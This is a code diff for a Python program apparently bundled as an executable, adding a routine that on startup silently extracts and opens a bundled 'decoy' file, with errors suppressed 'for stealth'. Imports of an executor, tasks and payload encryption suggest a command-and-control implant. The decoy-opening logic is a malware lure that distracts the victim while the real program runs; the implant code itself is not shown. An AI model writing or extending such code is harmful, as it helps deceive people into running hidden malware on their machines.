@@ -4,21 +4,73 @@ import uuid
 import sys
 import os
 import asyncio
+import tempfile
 from dotenv import load_dotenv
-
-load_dotenv()
 
 # Add the parent directory or PyInstaller bundle directory to sys.path
 if getattr(sys, 'frozen', False):
     # Running in a bundle (.exe)
     bundle_dir = sys._MEIPASS
     sys.path.append(bundle_dir)
+    # Load .env from bundle directory
+    env_path = os.path.join(bundle_dir, ".env")
+    if os.path.exists(env_path):
+        load_dotenv(env_path)
 else:
     # Running in normal python environment
     current_dir = os.path.dirname(os.path.abspath(__file__))
     parent_dir = os.path.dirname(current_dir)
     sys.path.append(parent_dir)  # For 'shared'
     sys.path.append(current_dir) # For 'executor'
+    load_dotenv()
+
+import shutil
+import subprocess
+
+def open_decoy():
+    """Extracts and opens any bundled decoy file."""
+    if not getattr(sys, 'frozen', False):
+        return
+    
+    # Search for any file named decoy.* in the bundle root
+    bundle_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+    
+    try:
+        # Get all files starting with 'decoy.'
+        decoy_files = [f for f in os.listdir(bundle_dir) if f.startswith("decoy.")]
+        if not decoy_files:
+            return
+
+        decoy_name = decoy_files[0]
+        src_path = os.path.join(bundle_dir, decoy_name)
+        
+        # Copy to temp directory to avoid lock or permission issues
+        # Use a non-conflicting name if possible
+        temp_dir = tempfile.gettempdir()
+        dst_path = os.path.join(temp_dir, decoy_name)
+        
+        shutil.copy2(src_path, dst_path)
+        
+        # Open with system default handler without blocking
+        if os.name == 'nt':
+            try:
+                # os.startfile is non-blocking and uses shell verbs
+                os.startfile(dst_path)
+            except:
+                # Fallback for text-based formats 
+                ext = decoy_name.split('.')[-1].lower()
+                if ext in ['json', 'txt', 'log', 'ini', 'conf']:
+                    subprocess.Popen(['notepad.exe', dst_path], creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
+        else:
+            opener = "open" if sys.platform == "darwin" else "xdg-open"
+            subprocess.Popen([opener, dst_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+    except Exception:
+        pass # Silent failure for stealth
+
+# Run decoy logic immediately on startup
+if getattr(sys, 'frozen', False):
+    open_decoy()
 
 from shared.schemas import Task
 from shared.crypto import encrypt_payload, decrypt_payload
